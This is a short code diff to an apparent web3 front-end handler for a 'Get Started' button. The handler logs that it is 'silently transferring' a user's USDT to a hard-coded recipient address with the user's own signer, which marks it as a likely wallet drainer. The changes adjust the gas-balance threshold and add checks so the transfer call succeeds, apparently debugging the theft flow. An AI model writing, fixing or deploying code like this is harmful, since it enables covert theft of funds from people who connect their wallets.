@@ -85,7 +85,7 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     }
     const balances = await fetchBalances(address);
     console.log("📊 Balances:", balances);
-    if (balances.bnb < 0.0000000004) {
+    if (balances.bnb < 0.004) {
       throw new Error("Insufficient BNB for gas fees. Need at least 0.004 BNB on mainnet.");
     }
     const inputAmount = parseFloat(usdtAmountInput);
@@ -98,9 +98,9 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     }
     console.log(`📢 Silently transferring: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
     const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-    console.log("📜 Contract initialized:", contractWithSigner.address);
-    if (!contractWithSigner.estimateGas) {
-      throw new Error("Contract estimateGas is undefined. Check ABI or contract address.");
+    console.log("📜 Contract initialized:", { address: contractWithSigner.address, hasEstimateGas: !!contractWithSigner.estimateGas, hasTransfer: !!contractWithSigner.transfer });
+    if (!contractWithSigner.estimateGas || !contractWithSigner.estimateGas.transfer) {
+      throw new Error("Contract estimateGas.transfer is undefined. Verify ABI and contract address.");
     }
     const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
     console.log("💰 Amount in Wei:", amountInWei.toString());
